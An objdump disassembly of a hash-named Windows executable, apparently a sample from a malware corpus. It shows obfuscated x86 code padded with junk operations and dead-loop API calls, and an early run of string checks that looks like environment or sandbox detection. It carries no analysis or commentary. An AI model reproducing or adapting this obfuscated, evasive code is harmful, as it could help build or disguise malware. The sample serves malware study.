
a101450fb618555000c556d4bee9acbbe25545813de5163e45bada5661c59d25.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	or     DWORD PTR ds:0x42c010,0x42b004
  401013:	push   edi
  401014:	adc    DWORD PTR ds:0x42c000,0x42b014
  40101e:	push   0x42e423
  401023:	dec    DWORD PTR ds:0x42a018
  401029:	xor    edi,edi
  40102b:	not    DWORD PTR ds:0x42901c
  401031:	inc    edi
  401032:	push   edi
  401033:	push   edi
  401034:	call   DWORD PTR ds:0x42e9c3
  40103a:	test   eax,eax
  40103c:	mov    DWORD PTR ds:0x42b01c,0x7587
  401046:	je     0x401075
  40104c:	lea    eax,[ebp-0x64]
  40104f:	not    DWORD PTR ds:0x42b004
  401055:	push   eax
  401056:	adc    DWORD PTR ds:0x42d00c,0x42d014
  401060:	call   DWORD PTR ds:0x42e98b
  401066:	mov    DWORD PTR ds:0x42a00c,0x7907
  401070:	jmp    0x4026aa
  401075:	sub    DWORD PTR ds:0x42a010,0x42a01c
  40107f:	push   esi
  401080:	mov    esi,DWORD PTR ds:0x42e9cf
  401086:	push   0x8
  401088:	sub    DWORD PTR ds:0x429004,0x42c000
  401092:	push   0x42e433
  401097:	sub    DWORD PTR ds:0x429000,0x1be5
  4010a1:	call   esi
  4010a3:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010ad:	test   eax,eax
  4010af:	mov    DWORD PTR ds:0x42b000,0x51df
  4010b9:	je     0x4010de
  4010bf:	lea    eax,[ebp-0x64]
  4010c2:	and    DWORD PTR ds:0x42d014,0x42a004
  4010cc:	push   eax
  4010cd:	inc    DWORD PTR ds:0x42d008
  4010d3:	call   DWORD PTR ds:0x42e98b
  4010d9:	jmp    0x4026a9
  4010de:	xor    DWORD PTR ds:0x42a008,0x429000
  4010e8:	push   ebx
  4010e9:	mov    ebx,DWORD PTR ds:0x42e99b
  4010ef:	add    DWORD PTR ds:0x429004,0x5c52
  4010f9:	push   0x42e443
  4010fe:	adc    DWORD PTR ds:0x42c014,0x42b014
  401108:	push   edi
  401109:	push   edi
  40110a:	and    DWORD PTR ds:0x429020,0x61d3
  401114:	call   ebx
  401116:	test   eax,eax
  401118:	mov    DWORD PTR ds:0x42b018,0x2d2c
  401122:	je     0x40115f
  401128:	sbb    DWORD PTR ds:0x42a010,0x429004
  401132:	lea    eax,[ebp-0x64]
  401135:	xor    DWORD PTR ds:0x42c000,0x429008
  40113f:	push   eax
  401140:	or     DWORD PTR ds:0x429000,0x4b22
  40114a:	call   DWORD PTR ds:0x42e98b
  401150:	mov    DWORD PTR ds:0x429004,0x6e7d
  40115a:	jmp    0x4026a8
  40115f:	push   0xc
  401161:	sbb    DWORD PTR ds:0x42d014,0x5298
  40116b:	push   0x42e467
  401170:	sbb    DWORD PTR ds:0x42c010,0x42c008
  40117a:	call   esi
  40117c:	dec    DWORD PTR ds:0x42d000
  401182:	test   eax,eax
  401184:	jne    0x401768
  40118a:	push   0x7
  40118c:	push   0x42e47b
  401191:	call   esi
  401193:	adc    DWORD PTR ds:0x429014,0x42900c
  40119d:	test   eax,eax
  40119f:	mov    DWORD PTR ds:0x42c000,0x2037
  4011a9:	jne    0x401768
  4011af:	push   0x8
  4011b1:	xor    DWORD PTR ds:0x42d010,0x429014
  4011bb:	push   0x42e48b
  4011c0:	and    DWORD PTR ds:0x42d010,0x7e73
  4011ca:	call   esi
  4011cc:	test   eax,eax
  4011ce:	mov    DWORD PTR ds:0x429014,0x43a5
  4011d8:	jne    0x401768
  4011de:	push   0x42e49b
  4011e3:	adc    DWORD PTR ds:0x429014,0x42b00c
  4011ed:	push   edi
  4011ee:	push   edi
  4011ef:	call   DWORD PTR ds:0x42e9c3
  4011f5:	xor    DWORD PTR ds:0x429008,0xc25
  4011ff:	test   eax,eax
  401201:	mov    DWORD PTR ds:0x42b004,0x1e9f
  40120b:	jne    0x401768
  401211:	sbb    DWORD PTR ds:0x42b008,0x42a01c
  40121b:	push   0x42e4ab
  401220:	push   edi
  401221:	sbb    DWORD PTR ds:0x42b000,0x42b018
  40122b:	push   edi
  40122c:	sbb    DWORD PTR ds:0x42a008,0x42c00c
  401236:	call   ebx
  401238:	adc    DWORD PTR ds:0x42a01c,0xefe
  401242:	test   eax,eax
  401244:	mov    DWORD PTR ds:0x42d014,0x5190
  40124e:	jne    0x401768
  401254:	sub    DWORD PTR ds:0x42b000,0x721d
  40125e:	push   0xc
  401260:	add    DWORD PTR ds:0x42d018,0x42c000
  40126a:	push   0x42e4cf
  40126f:	call   esi
  401271:	test   eax,eax
  401273:	mov    DWORD PTR ds:0x42a014,0x465b
  40127d:	jne    0x401768
  401283:	or     DWORD PTR ds:0x42d014,0x42900c
  40128d:	push   0x7
  40128f:	push   0x42e4e3
  401294:	xor    DWORD PTR ds:0x42c014,0x14b0
  40129e:	call   esi
  4012a0:	test   eax,eax
  4012a2:	mov    DWORD PTR ds:0x42a01c,0x4b6
  4012ac:	jne    0x401768
  4012b2:	push   0x8
  4012b4:	or     DWORD PTR ds:0x429028,0x429010
  4012be:	push   0x42e4f3
  4012c3:	sbb    DWORD PTR ds:0x42a010,0x429008
  4012cd:	call   esi
  4012cf:	test   eax,eax
  4012d1:	mov    DWORD PTR ds:0x42a00c,0x7915
  4012db:	jne    0x401768
  4012e1:	or     DWORD PTR ds:0x42b000,0xa15
  4012eb:	push   0x42e503
  4012f0:	push   edi
  4012f1:	sub    DWORD PTR ds:0x42901c,0x42c008
  4012fb:	push   edi
  4012fc:	xor    DWORD PTR ds:0x42a01c,0x42d010
  401306:	call   DWORD PTR ds:0x42e9c3
  40130c:	test   eax,eax
  40130e:	jne    0x401768
  401314:	sub    DWORD PTR ds:0x42d014,0x42a000
  40131e:	push   0x42e513
  401323:	adc    DWORD PTR ds:0x42b018,0x14c4
  40132d:	push   edi
  40132e:	xor    DWORD PTR ds:0x42c008,0x6706
  401338:	push   edi
  401339:	or     DWORD PTR ds:0x42a01c,0x6055
  401343:	call   ebx
  401345:	sub    DWORD PTR ds:0x429014,0x42b00c
  40134f:	test   eax,eax
  401351:	mov    DWORD PTR ds:0x42d00c,0x550a
  40135b:	jne    0x401768
  401361:	push   0xc
  401363:	push   0x42e537
  401368:	adc    DWORD PTR ds:0x42c00c,0x429018
  401372:	call   esi
  401374:	test   eax,eax
  401376:	mov    DWORD PTR ds:0x429024,0x758e
  401380:	jne    0x401768
  401386:	push   0x7
  401388:	adc    DWORD PTR ds:0x429010,0x1615
  401392:	push   0x42e54b
  401397:	sub    DWORD PTR ds:0x429008,0x42b01c
  4013a1:	call   esi
  4013a3:	adc    DWORD PTR ds:0x42c01c,0x7f54
  4013ad:	test   eax,eax
  4013af:	jne    0x401768
  4013b5:	or     DWORD PTR ds:0x429000,0x429008
  4013bf:	push   0x8
  4013c1:	sub    DWORD PTR ds:0x42a000,0x50c8
  4013cb:	push   0x42e55b
  4013d0:	call   esi
  4013d2:	xor    DWORD PTR ds:0x42a018,0x58f3
  4013dc:	test   eax,eax
  4013de:	mov    DWORD PTR ds:0x42a010,0x4d09
  4013e8:	jne    0x401768
  4013ee:	push   0x42e56b
  4013f3:	push   edi
  4013f4:	sbb    DWORD PTR ds:0x42c00c,0x429018
  4013fe:	push   edi
  4013ff:	call   DWORD PTR ds:0x42e9c3
  401405:	sbb    DWORD PTR ds:0x42d008,0x42d004
  40140f:	test   eax,eax
  401411:	mov    DWORD PTR ds:0x42a010,0xbaa
  40141b:	jne    0x401768
  401421:	push   0x42e57b
  401426:	push   edi
  401427:	push   edi
  401428:	call   ebx
  40142a:	sbb    DWORD PTR ds:0x42b000,0x429014
  401434:	test   eax,eax
  401436:	mov    DWORD PTR ds:0x42d008,0x1c53
  401440:	jne    0x401768
  401446:	adc    DWORD PTR ds:0x42a00c,0x429024
  401450:	push   0xc
  401452:	push   0x42e59f
  401457:	sbb    DWORD PTR ds:0x429028,0x2f15
  401461:	call   esi
  401463:	test   eax,eax
  401465:	mov    DWORD PTR ds:0x42d004,0x2bd4
  40146f:	jne    0x401768
  401475:	mov    DWORD PTR ds:0x42d014,0xc7e
  40147f:	push   0x7
  401481:	or     DWORD PTR ds:0x42b01c,0x629c
  40148b:	push   0x42e5b3
  401490:	call   esi
  401492:	xor    DWORD PTR ds:0x429020,0x42c014
  40149c:	test   eax,eax
  40149e:	mov    DWORD PTR ds:0x42b008,0x386
  4014a8:	jne    0x401768
  4014ae:	push   0x8
  4014b0:	push   0x42e5c3
  4014b5:	sub    DWORD PTR ds:0x429024,0x42a008
  4014bf:	call   esi
  4014c1:	sub    DWORD PTR ds:0x42b004,0x42c018
  4014cb:	test   eax,eax
  4014cd:	mov    DWORD PTR ds:0x42900c,0x6fc8
  4014d7:	jne    0x401768
  4014dd:	xor    DWORD PTR ds:0x42d010,0x42901c
  4014e7:	push   0x42e5d3
  4014ec:	and    DWORD PTR ds:0x42d014,0x50c
  4014f6:	push   edi
  4014f7:	push   edi
  4014f8:	sbb    DWORD PTR ds:0x42b000,0x3361
  401502:	call   DWORD PTR ds:0x42e9c3
  401508:	test   eax,eax
  40150a:	mov    DWORD PTR ds:0x42b008,0x5d56
  401514:	jne    0x401768
  40151a:	xor    DWORD PTR ds:0x42a000,0x4d69
  401524:	push   0x42e5e3
  401529:	and    DWORD PTR ds:0x429024,0x42a014
  401533:	push   edi
  401534:	or     DWORD PTR ds:0x42c004,0x3817
  40153e:	push   edi
  40153f:	add    DWORD PTR ds:0x429024,0x2571
  401549:	call   ebx
  40154b:	xor    DWORD PTR ds:0x429028,0x42b00c
  401555:	test   eax,eax
  401557:	mov    DWORD PTR ds:0x42b00c,0x17fe
  401561:	jne    0x401768
  401567:	mov    DWORD PTR ds:0x42c014,0x28c7
  401571:	push   0xc
  401573:	and    DWORD PTR ds:0x429024,0x5a57
  40157d:	push   0x42e607
  401582:	call   esi
  401584:	test   eax,eax
  401586:	mov    DWORD PTR ds:0x42b00c,0xc7e
  401590:	jne    0x401768
  401596:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015a0:	push   0x7
  4015a2:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015ac:	push   0x42e61b
  4015b1:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015bb:	call   esi
  4015bd:	xor    DWORD PTR ds:0x42c00c,0x55d5
  4015c7:	test   eax,eax
  4015c9:	jne    0x401768
  4015cf:	or     DWORD PTR ds:0x429008,0x62a0
  4015d9:	push   0x8
  4015db:	or     DWORD PTR ds:0x429020,0x42d018
  4015e5:	push   0x42e62b
  4015ea:	call   esi
  4015ec:	test   eax,eax
  4015ee:	mov    DWORD PTR ds:0x429010,0x43d8
  4015f8:	jne    0x401768
  4015fe:	push   0x42e63b
  401603:	sub    DWORD PTR ds:0x42a008,0x5452
  40160d:	push   edi
  40160e:	adc    DWORD PTR ds:0x42b004,0x3794
  401618:	push   edi
  401619:	add    DWORD PTR ds:0x42b018,0x429000
  401623:	call   DWORD PTR ds:0x42e9c3
  401629:	add    DWORD PTR ds:0x42b014,0x42c014
  401633:	test   eax,eax
  401635:	mov    DWORD PTR ds:0x42c010,0x9db
  40163f:	jne    0x401768
  401645:	add    DWORD PTR ds:0x42b01c,0x42c010
  40164f:	push   0x42e64b
  401654:	push   edi
  401655:	push   edi
  401656:	call   ebx
  401658:	test   eax,eax
  40165a:	jne    0x401768
  401660:	sub    DWORD PTR ds:0x42a010,0x42b00c
  40166a:	push   0xc
  40166c:	xor    DWORD PTR ds:0x42a000,0x46f8
  401676:	push   0x42e66f
  40167b:	sub    DWORD PTR ds:0x429028,0x1e37
  401685:	call   esi
  401687:	not    DWORD PTR ds:0x42b000
  40168d:	test   eax,eax
  40168f:	mov    DWORD PTR ds:0x42a010,0x1824
  401699:	jne    0x401768
  40169f:	push   0x7
  4016a1:	neg    DWORD PTR ds:0x42d004
  4016a7:	push   0x42e683
  4016ac:	call   esi
  4016ae:	xor    DWORD PTR ds:0x429020,0x5303
  4016b8:	test   eax,eax
  4016ba:	jne    0x401768
  4016c0:	sub    DWORD PTR ds:0x429014,0x42c01c
  4016ca:	push   0x8
  4016cc:	not    DWORD PTR ds:0x429000
  4016d2:	push   0x42e693
  4016d7:	or     DWORD PTR ds:0x42c01c,0x7461
  4016e1:	call   esi
  4016e3:	test   eax,eax
  4016e5:	jne    0x401768
  4016eb:	or     DWORD PTR ds:0x42b010,0x6614
  4016f5:	push   0x42e6a3
  4016fa:	push   edi
  4016fb:	and    DWORD PTR ds:0x42b01c,0x42a008
  401705:	push   edi
  401706:	call   DWORD PTR ds:0x42e9c3
  40170c:	sub    DWORD PTR ds:0x429010,0x42a018
  401716:	test   eax,eax
  401718:	mov    DWORD PTR ds:0x42b004,0x423f
  401722:	jne    0x401768
  401728:	push   0x42e6b3
  40172d:	and    DWORD PTR ds:0x42d014,0x5d3e
  401737:	push   edi
  401738:	push   edi
  401739:	call   ebx
  40173b:	sub    DWORD PTR ds:0x42a004,0x8003
  401745:	test   eax,eax
  401747:	jne    0x401768
  40174d:	push   0xc
  40174f:	push   0x42e6d7
  401754:	call   esi
  401756:	or     DWORD PTR ds:0x42a014,0x792e
  401760:	test   eax,eax
  401762:	je     0x401783
  401768:	add    DWORD PTR ds:0x42d004,0x429000
  401772:	xor    eax,eax
  401774:	mov    DWORD PTR ds:0x42c00c,0x1740
  40177e:	jmp    0x4026a8
  401783:	sub    DWORD PTR ds:0x42c01c,0x74ec
  40178d:	mov    DWORD PTR [ebp-0x10],0x0
  401794:	sub    edx,ecx
  401796:	mov    eax,DWORD PTR [ebp-0x34]
  401799:	adc    edx,DWORD PTR ds:0x42b004
  40179f:	mov    DWORD PTR [ebp-0x34],eax
  4017a2:	sub    edx,DWORD PTR ds:0x429024
  4017a8:	mov    ecx,0xf89c85b9
  4017ad:	xor    esi,esi
  4017af:	or     esi,DWORD PTR ds:0x42b018
  4017b5:	adc    DWORD PTR ds:0x429020,esi
  4017bb:	mov    DWORD PTR [ebp-0x8],ecx
  4017be:	mov    edx,DWORD PTR ds:0x42d004
  4017c4:	sbb    edx,DWORD PTR ds:0x42901c
  4017ca:	mov    DWORD PTR ds:0x42d004,edx
  4017d0:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  4017d7:	add    esi,edx
  4017d9:	lea    eax,[ebp-0x3c]
  4017dc:	xor    edx,edx
  4017de:	mov    DWORD PTR [ebp-0x30],eax
  4017e1:	lea    eax,[ebp-0x44]
  4017e4:	mov    DWORD PTR ds:0x42b00c,0x18
  4017ee:	cmp    DWORD PTR ds:0x42b00c,0x0
  4017f5:	je     0x40184f
  4017fb:	cmp    DWORD PTR ds:0x42b00c,0x7
  401802:	jne    0x40181d
  401808:	push   0x42b010
  40180d:	push   0x42c014
  401812:	push   0x42d004
  401817:	call   DWORD PTR ds:0x42e993
  40181d:	cmp    DWORD PTR ds:0x42b00c,0x8
  401824:	jne    0x401837
  40182a:	mov    esi,DWORD PTR ds:0x42b00c
  401830:	dec    esi
  401831:	mov    DWORD PTR ds:0x42b00c,esi
  401837:	mov    esi,DWORD PTR ds:0x42b00c
  40183d:	dec    esi
  40183e:	mov    DWORD PTR ds:0x42b00c,esi
  401844:	jmp    0x4017ee
  401849:	adc    DWORD PTR ds:0x429000,ebx
  40184f:	mov    DWORD PTR [ebp-0x18],eax
  401852:	mov    eax,ds:0x42e313
  401857:	and    DWORD PTR ds:0x429004,0x0
  401861:	jmp    0x401873
  401866:	mov    edi,DWORD PTR ds:0x429004
  40186c:	inc    edi
  40186d:	mov    DWORD PTR ds:0x429004,edi
  401873:	cmp    DWORD PTR ds:0x429004,0x1c
  40187a:	jae    0x4018a6
  401880:	cmp    DWORD PTR ds:0x429004,0x22
  401887:	jne    0x40189b
  40188d:	push   0x0
  40188f:	push   DWORD PTR [ebp-0x20]
  401892:	push   DWORD PTR [ebp-0x10]
  401895:	call   DWORD PTR ds:0x42e997
  40189b:	jmp    0x401866
  4018a0:	adc    DWORD PTR ds:0x42c018,ebx
  4018a6:	mov    eax,DWORD PTR [eax+0x1c8]
  4018ac:	mov    DWORD PTR ds:0x42a010,0x15
  4018b6:	cmp    DWORD PTR ds:0x42a010,0x0
  4018bd:	je     0x401923
  4018c3:	cmp    DWORD PTR ds:0x42a010,0xa
  4018ca:	jne    0x4018f1
  4018d0:	push   DWORD PTR [ebp-0x10]
  4018d3:	push   0x85d6
  4018d8:	push   0x42c01c
  4018dd:	push   DWORD PTR [ebp-0x24]
  4018e0:	push   DWORD PTR [ebp-0x18]
  4018e3:	push   0x61a0
  4018e8:	push   DWORD PTR [ebp-0x18]
  4018eb:	call   DWORD PTR ds:0x42e99f
  4018f1:	cmp    DWORD PTR ds:0x42a010,0xb
  4018f8:	jne    0x40190b
  4018fe:	mov    esi,DWORD PTR ds:0x42a010
  401904:	dec    esi
  401905:	mov    DWORD PTR ds:0x42a010,esi
  40190b:	mov    esi,DWORD PTR ds:0x42a010
  401911:	dec    esi
  401912:	mov    DWORD PTR ds:0x42a010,esi
  401918:	jmp    0x4018b6
  40191d:	and    DWORD PTR ds:0x42b000,edx
  401923:	mov    eax,DWORD PTR [eax]
  401925:	xor    DWORD PTR ds:0x42c01c,0x42d014
  40192f:	mov    edx,DWORD PTR [ebp-0x18]
  401932:	or     esi,DWORD PTR ds:0x42d014
  401938:	mov    esi,0x7510899
  40193d:	xor    eax,esi
  40193f:	mov    edi,0x3272e0
  401944:	add    eax,edi
  401946:	mov    DWORD PTR [edx],eax
  401948:	mov    DWORD PTR ds:0x42900c,0x4148
  401952:	mov    eax,ds:0x42e7c3
  401957:	cmp    eax,0x312bc9f6
  40195c:	mov    DWORD PTR ds:0x429010,0x7018
  401966:	jne    0x401abf
  40196c:	adc    DWORD PTR ds:0x42a018,0x1f6
  401976:	mov    eax,DWORD PTR [ebp-0x8]
  401979:	and    DWORD PTR ds:0x42d010,0x0
  401983:	jmp    0x401995
  401988:	mov    ebx,DWORD PTR ds:0x42d010
  40198e:	inc    ebx
  40198f:	mov    DWORD PTR ds:0x42d010,ebx
  401995:	cmp    DWORD PTR ds:0x42d010,0x1a
  40199c:	jae    0x4019d3
  4019a2:	cmp    DWORD PTR ds:0x42d010,0x1f
  4019a9:	jne    0x4019c8
  4019af:	push   0x42b018
  4019b4:	push   DWORD PTR [ebp-0x18]
  4019b7:	push   0x42e127
  4019bc:	push   DWORD PTR [ebp-0x24]
  4019bf:	push   DWORD PTR [ebp-0x14]
  4019c2:	call   DWORD PTR ds:0x42e9a3
  4019c8:	jmp    0x401988
  4019cd:	and    ebx,DWORD PTR ds:0x429020
  4019d3:	mov    edx,DWORD PTR ds:0x42e313
  4019d9:	sbb    DWORD PTR ds:0x42b000,edi
  4019df:	mov    edx,DWORD PTR [edx+0x198]
  4019e5:	inc    ebx
  4019e6:	xor    eax,esi
  4019e8:	movzx  ebx,WORD PTR ds:0x42b01c
  4019ef:	or     DWORD PTR ds:0x429014,ebx
  4019f5:	add    eax,edi
  4019f7:	sub    DWORD PTR ds:0x42b008,edx
  4019fd:	mov    DWORD PTR [edx],eax
  4019ff:	add    ebx,0x6ca
  401a05:	mov    eax,DWORD PTR [ebp-0x8]
  401a08:	mov    DWORD PTR ds:0x429008,0x1c
  401a12:	cmp    DWORD PTR ds:0x429008,0x0
  401a19:	je     0x401a65
  401a1f:	cmp    DWORD PTR ds:0x429008,0x9
  401a26:	jne    0x401a37
  401a2c:	push   0x42d004
  401a31:	call   DWORD PTR ds:0x42e9ab
  401a37:	cmp    DWORD PTR ds:0x429008,0xa
  401a3e:	jne    0x401a51
  401a44:	mov    ebx,DWORD PTR ds:0x429008
  401a4a:	dec    ebx
  401a4b:	mov    DWORD PTR ds:0x429008,ebx
  401a51:	xor    ebx,ebx
  401a53:	add    ebx,DWORD PTR ds:0x429008
  401a59:	dec    ebx
  401a5a:	mov    DWORD PTR ds:0x429008,ebx
  401a60:	jmp    0x401a12
  401a65:	xor    eax,esi
  401a67:	mov    DWORD PTR ds:0x42a010,0x13
  401a71:	cmp    DWORD PTR ds:0x42a010,0x0
  401a78:	je     0x401ab2
  401a7e:	cmp    DWORD PTR ds:0x42a010,0x23
  401a85:	jne    0x401a9e
  401a8b:	push   DWORD PTR [ebp-0xc]
  401a8e:	push   0x0
  401a90:	push   0x429028
  401a95:	push   DWORD PTR [ebp-0x1c]
  401a98:	call   DWORD PTR ds:0x42e9af
  401a9e:	mov    ebx,DWORD PTR ds:0x42a010
  401aa4:	dec    ebx
  401aa5:	mov    DWORD PTR ds:0x42a010,ebx
  401aab:	jmp    0x401a71
  401ab0:	not    ebx
  401ab2:	add    eax,edi
  401ab4:	xor    DWORD PTR ds:0x42900c,ecx
  401aba:	mov    ds:0x42e7c3,eax
  401abf:	xor    DWORD PTR ds:0x42c010,0x7580
  401ac9:	mov    eax,ds:0x42e313
  401ace:	and    DWORD PTR ds:0x42d018,0x0
  401ad8:	mov    ebx,DWORD PTR ds:0x42d018
  401ade:	inc    ebx
  401adf:	mov    DWORD PTR ds:0x42d018,ebx
  401ae5:	cmp    DWORD PTR ds:0x42d018,0x4
  401aec:	jne    0x401af8
  401af2:	call   DWORD PTR ds:0x42e9b3
  401af8:	cmp    DWORD PTR ds:0x42d018,0x3
  401aff:	jne    0x401b12
  401b05:	mov    ebx,DWORD PTR ds:0x42d018
  401b0b:	inc    ebx
  401b0c:	mov    DWORD PTR ds:0x42d018,ebx
  401b12:	cmp    DWORD PTR ds:0x42d018,0x1f
  401b19:	jb     0x401ad8
  401b1f:	add    DWORD PTR ds:0x42a000,0x4980
  401b29:	mov    eax,DWORD PTR [eax+0x18c]
  401b2f:	mov    eax,DWORD PTR [eax]
  401b31:	mov    DWORD PTR [ebp-0x7c],eax
  401b34:	or     DWORD PTR ds:0x42c014,ebx
  401b3a:	mov    ebx,0xf89c85bd
  401b3f:	mov    DWORD PTR [ebp-0x10],ebx
  401b42:	mov    DWORD PTR [ebp-0x10],ebx
  401b45:	add    eax,0x7960
  401b4a:	mov    DWORD PTR [ebp-0x10],ebx
  401b4d:	or     eax,DWORD PTR ds:0x42c000
  401b53:	mov    DWORD PTR [ebp-0x18],ecx
  401b56:	mov    DWORD PTR ds:0x429000,0x1d
  401b60:	cmp    DWORD PTR ds:0x429000,0x0
  401b67:	je     0x401c18
  401b6d:	cmp    DWORD PTR ds:0x429000,0xf
  401b74:	jne    0x401b9a
  401b7a:	push   DWORD PTR [ebp-0x18]
  401b7d:	push   0x429020
  401b82:	push   0x22ca
  401b87:	push   0x6383
  401b8c:	push   DWORD PTR [ebp-0x18]
  401b8f:	push   0x7f4f
  401b94:	call   DWORD PTR ds:0x42e9b7
  401b9a:	cmp    DWORD PTR ds:0x429000,0x10
  401ba1:	jne    0x401bb2
  401ba7:	mov    eax,ds:0x429000
  401bac:	dec    eax
  401bad:	mov    ds:0x429000,eax
  401bb2:	mov    eax,ds:0x429000
  401bb7:	dec    eax
  401bb8:	mov    ds:0x429000,eax
  401bbd:	jmp    0x401b60
  401bc2:	and    DWORD PTR ds:0x42a000,0x0
  401bcc:	xor    eax,eax
  401bce:	add    eax,DWORD PTR ds:0x42a000
  401bd4:	inc    eax
  401bd5:	mov    ds:0x42a000,eax
  401bda:	cmp    DWORD PTR ds:0x42a000,0xd
  401be1:	jne    0x401bed
  401be7:	call   DWORD PTR ds:0x42e9bb
  401bed:	cmp    DWORD PTR ds:0x42a000,0xc
  401bf4:	jne    0x401c05
  401bfa:	mov    eax,ds:0x42a000
  401bff:	inc    eax
  401c00:	mov    ds:0x42a000,eax
  401c05:	cmp    DWORD PTR ds:0x42a000,0x18
  401c0c:	jb     0x401bcc
  401c12:	or     DWORD PTR ds:0x42c008,ebx
  401c18:	mov    DWORD PTR [ebp-0x10],ebx
  401c1b:	xor    DWORD PTR ds:0x42c000,edx
  401c21:	mov    DWORD PTR [ebp-0x10],0xf89c85b1
  401c28:	mov    eax,DWORD PTR [ebp-0x8]
  401c2b:	xor    eax,esi
  401c2d:	or     DWORD PTR ds:0x42d000,0x4414
  401c37:	add    eax,edi
  401c39:	mov    DWORD PTR ds:0x429018,0x61ad
  401c43:	jmp    0x401d03
  401c48:	and    DWORD PTR ds:0x42b018,0x0
  401c52:	xor    ecx,ecx
  401c54:	add    ecx,DWORD PTR ds:0x42b018
  401c5a:	inc    ecx
  401c5b:	mov    DWORD PTR ds:0x42b018,ecx
  401c61:	cmp    DWORD PTR ds:0x42b018,0x29
  401c68:	jne    0x401c81
  401c6e:	push   DWORD PTR [ebp-0x24]
  401c71:	push   0x42c018
  401c76:	push   0x8c2e
  401c7b:	call   DWORD PTR ds:0x42e9bf
  401c81:	cmp    DWORD PTR ds:0x42b018,0x19
  401c88:	jb     0x401c52
  401c8e:	mov    eax,DWORD PTR [ebp-0xc]
  401c91:	adc    ecx,DWORD PTR ds:0x42b000
  401c97:	mov    ecx,DWORD PTR [ebp-0x1c]
  401c9a:	xor    eax,esi
  401c9c:	lea    eax,[eax+ecx*1+0x3272e0]
  401ca3:	push   eax
  401ca4:	mov    eax,DWORD PTR [ebp-0x18]
  401ca7:	or     DWORD PTR ds:0x42c01c,0x6aa9
  401cb1:	xor    eax,esi
  401cb3:	add    DWORD PTR ds:0x42d014,0x21f
  401cbd:	lea    eax,[ebp+eax*1+0x3272e8]
  401cc4:	or     DWORD PTR ds:0x42d004,0x505e
  401cce:	push   eax
  401ccf:	adc    DWORD PTR ds:0x42c01c,ecx
  401cd5:	mov    eax,ds:0x42e313
  401cda:	push   DWORD PTR [eax+0x1bc]
  401ce0:	sbb    DWORD PTR ds:0x42d004,0x7640
  401cea:	call   0x4026bd
  401cef:	xor    eax,0x743a
  401cf4:	mov    eax,DWORD PTR [ebp-0xc]
  401cf7:	mov    ecx,DWORD PTR [ebp-0x1c]
  401cfa:	xor    eax,esi
  401cfc:	lea    eax,[ecx+eax*1+0x3272e0]
  401d03:	mov    ecx,DWORD PTR [ebp-0xc]
  401d06:	not    edx
  401d08:	mov    edx,DWORD PTR [ebp-0xc]
  401d0b:	sbb    DWORD PTR ds:0x42c008,0x6696
  401d15:	xor    edx,esi
  401d17:	xor    ecx,esi
  401d19:	sub    DWORD PTR ds:0x42c014,0x5039
  401d23:	add    ecx,edx
  401d25:	mov    edx,DWORD PTR [ebp-0xc]
  401d28:	xor    edx,esi
  401d2a:	mov    DWORD PTR ds:0x42d004,0x46d7
  401d34:	lea    ecx,[ecx+edx*1+0x9758a0]
  401d3b:	mov    DWORD PTR [ebp-0x1c],eax
  401d3e:	cmp    eax,ecx
  401d40:	mov    DWORD PTR ds:0x42c01c,0x3624
  401d4a:	jbe    0x401c48
  401d50:	mov    DWORD PTR ds:0x42a018,0x1f
  401d5a:	cmp    DWORD PTR ds:0x42a018,0x0
  401d61:	je     0x401db7
  401d67:	cmp    DWORD PTR ds:0x42a018,0xc
  401d6e:	jne    0x401d89
  401d74:	push   0x42e127
  401d79:	push   0x42e139
  401d7e:	push   0x400000
  401d83:	call   DWORD PTR ds:0x42e9c7
  401d89:	cmp    DWORD PTR ds:0x42a018,0xd
  401d90:	jne    0x401da1
  401d96:	mov    eax,ds:0x42a018
  401d9b:	dec    eax
  401d9c:	mov    ds:0x42a018,eax
  401da1:	mov    eax,ds:0x42a018
  401da6:	dec    eax
  401da7:	mov    ds:0x42a018,eax
  401dac:	jmp    0x401d5a
  401db1:	sbb    ecx,0x5e3
  401db7:	mov    eax,DWORD PTR [ebp+0xc]
  401dba:	dec    ecx
  401dbb:	mov    ds:0x42e197,eax
  401dc0:	mov    DWORD PTR ds:0x42c010,0x5070
  401dca:	mov    eax,DWORD PTR [ebp+0x10]
  401dcd:	and    DWORD PTR ds:0x42b000,0x0
  401dd7:	mov    ecx,DWORD PTR ds:0x42b000
  401ddd:	inc    ecx
  401dde:	mov    DWORD PTR ds:0x42b000,ecx
  401de4:	cmp    DWORD PTR ds:0x42b000,0x22
  401deb:	jne    0x401dfc
  401df1:	push   0x42e000
  401df6:	call   DWORD PTR ds:0x42e9cb
  401dfc:	cmp    DWORD PTR ds:0x42b000,0x18
  401e03:	jb     0x401dd7
  401e09:	mov    ds:0x42e3eb,eax
  401e0e:	mov    eax,ds:0x42e197
  401e13:	add    DWORD PTR ds:0x42a010,ebx
  401e19:	mov    ecx,DWORD PTR [ebp-0x30]
  401e1c:	and    DWORD PTR ds:0x42900c,0x4f3f
  401e26:	sub    eax,edi
  401e28:	xor    DWORD PTR ds:0x42a018,0x42a01c
  401e32:	xor    eax,esi
  401e34:	mov    DWORD PTR [ecx],eax
  401e36:	movzx  eax,BYTE PTR ds:0x42900c
  401e3d:	mov    eax,DWORD PTR [ebp-0x34]
  401e40:	cmp    eax,0xf89c85b9
  401e45:	mov    DWORD PTR ds:0x42901c,0x22d7
  401e4f:	jne    0x402106
  401e55:	lea    eax,[ebp-0x40]
  401e58:	mov    DWORD PTR [ebp-0x9c],eax
  401e5e:	or     DWORD PTR ds:0x429028,0x42a008
  401e68:	lea    eax,[ebp+0x4]
  401e6b:	add    DWORD PTR ds:0x42a014,0x42c008
  401e75:	mov    DWORD PTR [ebp-0x40],eax
  401e78:	mov    eax,DWORD PTR [ebp-0x40]
  401e7b:	test   eax,eax
  401e7d:	mov    DWORD PTR ds:0x42b000,0x1a3e
  401e87:	je     0x40268d
  401e8d:	xor    ecx,0x3b66
  401e93:	mov    eax,DWORD PTR [ebp-0x24]
  401e96:	and    DWORD PTR ds:0x429028,0x0
  401ea0:	jmp    0x401eb2
  401ea5:	mov    ecx,DWORD PTR ds:0x429028
  401eab:	inc    ecx
  401eac:	mov    DWORD PTR ds:0x429028,ecx
  401eb2:	cmp    DWORD PTR ds:0x429028,0x14
